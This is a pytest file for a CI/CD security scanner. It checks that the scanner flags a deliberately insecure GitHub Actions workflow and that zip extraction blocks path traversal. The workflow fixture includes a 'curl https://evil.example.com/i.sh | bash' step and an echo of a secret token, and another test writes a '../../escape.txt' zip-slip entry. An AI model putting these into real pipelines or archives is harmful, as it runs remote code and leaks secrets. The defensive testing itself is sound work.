"""
Repository analysis integration (Phase 2.6) — end-to-end.

Drives analyze_repository over a real GitHub Actions sample packaged as a .zip and
asserts the CI/CD findings flow through the SHARED finalize pipeline (fusion →
ownership → confidence → evidence → triage → scoring) and that the tree is
persisted for the Source Explorer.

Run: ``python -m pytest tests/test_repo_analyzer.py`` from the backend directory.
"""
from __future__ import annotations

import os
import tempfile
import zipfile
from pathlib import Path

from analyzers import repo_analyzer, scan_storage


GH_WORKFLOW = """\
name: CI
on: [push]
permissions: write-all
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
      - run: curl https://evil.example.com/i.sh | bash
      - run: echo "${{ secrets.TOKEN }}"
"""


def _make_repo_zip(tmp: str) -> str:
    repo = os.path.join(tmp, "src")
    wf = os.path.join(repo, ".github", "workflows", "ci.yml")
    os.makedirs(os.path.dirname(wf), exist_ok=True)
    with open(wf, "w", encoding="utf-8") as f:
        f.write(GH_WORKFLOW)
    with open(os.path.join(repo, "README.md"), "w", encoding="utf-8") as f:
        f.write("# demo\n")
    zip_path = os.path.join(tmp, "myrepo.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _dirs, files in os.walk(repo):
            for name in files:
                full = os.path.join(root, name)
                zf.write(full, os.path.relpath(full, repo))
    return zip_path


def test_repository_scan_end_to_end():
    with tempfile.TemporaryDirectory() as tmp:
        # Isolate scan persistence to the temp dir.
        scan_storage.SCAN_ROOT = Path(tmp) / "scans"
        zip_path = _make_repo_zip(tmp)

        res = repo_analyzer.analyze_repository(zip_path, "cicd-test-1", "myrepo.zip")

        assert res["platform"] == "cicd"
        assert res["app_name"] == "myrepo"
        assert res["findings"], "expected CI/CD findings"

        # CI/CD engine metadata present.
        assert "github_actions" in res["cicd"]["platforms"]
        assert any("ci.yml" in p for p in res["cicd"]["pipeline_files"])

        # Finalize ran: scoring + severity summary produced, findings normalized.
        assert "score" in res and isinstance(res["score"].get("score"), int)
        assert "severity_summary" in res
        assert all(f.get("severity") for f in res["findings"])
        # Source attribution preserved through fusion.
        assert any(f.get("source") == "CI/CD" for f in res["findings"])

        # Tree persisted for the Source Explorer (finding → source navigation).
        persisted = scan_storage.scan_root("cicd-test-1") / "repo" / ".github" / "workflows" / "ci.yml"
        assert persisted.exists(), "workflow should be persisted under repo/ for the viewer"


def test_zip_slip_is_rejected():
    with tempfile.TemporaryDirectory() as tmp:
        scan_storage.SCAN_ROOT = Path(tmp) / "scans"
        zip_path = os.path.join(tmp, "evil.zip")
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr("../../escape.txt", "pwned")
            zf.writestr(".github/workflows/ok.yml", "on: [push]\njobs: {}\n")
        dest = os.path.join(tmp, "out")
        os.makedirs(dest)
        repo_analyzer._safe_extract(zip_path, dest)
        # The traversal member must not have escaped the destination.
        assert not os.path.exists(os.path.join(tmp, "escape.txt"))
